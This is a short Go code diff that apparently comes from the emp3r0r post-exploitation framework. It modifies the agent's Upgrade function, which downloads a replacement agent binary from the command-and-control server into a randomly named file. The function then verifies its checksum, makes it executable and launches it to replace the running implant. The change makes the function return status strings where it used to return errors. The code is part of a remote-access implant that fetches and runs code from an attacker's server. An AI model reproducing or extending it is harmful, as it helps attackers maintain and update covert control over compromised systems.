@@ -128,19 +128,26 @@ func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
 	return &info
 }
 
-func Upgrade(checksum string) error {
+func Upgrade(checksum string) (out string) {
 	tempfile := RuntimeConfig.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
 	_, err := DownloadViaCC("agent", tempfile)
 	if err != nil {
-		return fmt.Errorf("Download agent: %v", err)
+		return fmt.Sprintf("Error: Download agent: %v", err)
 	}
 	download_checksum := tun.SHA256SumFile(tempfile)
 	if checksum != download_checksum {
-		return fmt.Errorf("checksum mismatch: %s expected, got %s", checksum, download_checksum)
+		return fmt.Sprintf("Error: checksum mismatch: %s expected, got %s", checksum, download_checksum)
 	}
 	err = os.Chmod(tempfile, 0755)
 	if err != nil {
-		return fmt.Errorf("chmod %s: %v", tempfile, err)
+		return fmt.Sprintf("Error: chmod %s: %v", tempfile, err)
 	}
-	return exec.Command(tempfile, "-replace").Start()
+	cmd := exec.Command(tempfile)
+	cmd.Env = append(os.Environ(), "REPLACE_AGENT=1")
+	err = cmd.Start()
+	if err != nil {
+		return fmt.Sprintf("Error: %v", err)
+	}
+
+	return fmt.Sprintf("Agent started with PID %d", cmd.Process.Pid)
 }
